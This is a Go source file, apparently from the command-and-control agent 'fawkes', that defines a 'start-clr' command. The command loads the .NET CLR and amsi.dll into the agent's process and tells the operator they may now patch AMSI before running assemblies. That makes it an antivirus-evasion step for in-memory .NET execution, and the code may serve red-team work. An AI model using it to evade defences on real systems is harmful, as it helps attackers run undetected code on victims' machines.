// +build windows

package commands

import (
	"fmt"
	"runtime"
	"sync"
	"syscall"

	"fawkes/pkg/structs"

	"github.com/Ne0nd0g/go-clr"
)

var (
	clrInitialized bool
	clrMutex       sync.Mutex
)

// StartCLRCommand implements the start-clr command
type StartCLRCommand struct{}

// Name returns the command name
func (c *StartCLRCommand) Name() string {
	return "start-clr"
}

// Description returns the command description
func (c *StartCLRCommand) Description() string {
	return "Initialize the .NET CLR runtime and load AMSI.dll in the current process"
}

// Execute executes the start-clr command
func (c *StartCLRCommand) Execute(task structs.Task) structs.CommandResult {
	clrMutex.Lock()
	defer clrMutex.Unlock()

	// Ensure we're on Windows
	if runtime.GOOS != "windows" {
		return structs.CommandResult{
			Output:    "Error: This command is only supported on Windows",
			Status:    "error",
			Completed: true,
		}
	}

	// Check if CLR is already initialized
	if clrInitialized {
		return structs.CommandResult{
			Output:    "CLR already initialized in this process",
			Status:    "completed",
			Completed: true,
		}
	}

	var output string

	// Load and initialize the CLR using go-clr
	// LoadCLR will handle checking if it's already loaded
	_, err := clr.LoadCLR("v4.0.30319")
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error initializing CLR: %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	output += "[+] CLR v4.0.30319 runtime initialized successfully\n"

	// Step 2: Explicitly load AMSI.dll
	err = loadAMSI()
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("%s[-] Warning: Failed to load AMSI.dll: %v", output, err),
			Status:    "completed",
			Completed: true,
		}
	}
	output += "[+] AMSI.dll loaded successfully\n"

	clrInitialized = true
	output += "\n[*] CLR and AMSI are now loaded. You may now patch AMSI before executing assemblies."

	return structs.CommandResult{
		Output:    output,
		Status:    "completed",
		Completed: true,
	}
}

// loadAMSI explicitly loads amsi.dll into the process
func loadAMSI() error {
	amsiDLL, err := syscall.LoadDLL("amsi.dll")
	if err != nil {
		return fmt.Errorf("failed to load amsi.dll: %v", err)
	}
	// We keep the handle - don't release it since we want AMSI loaded in memory
	_ = amsiDLL

	return nil
}
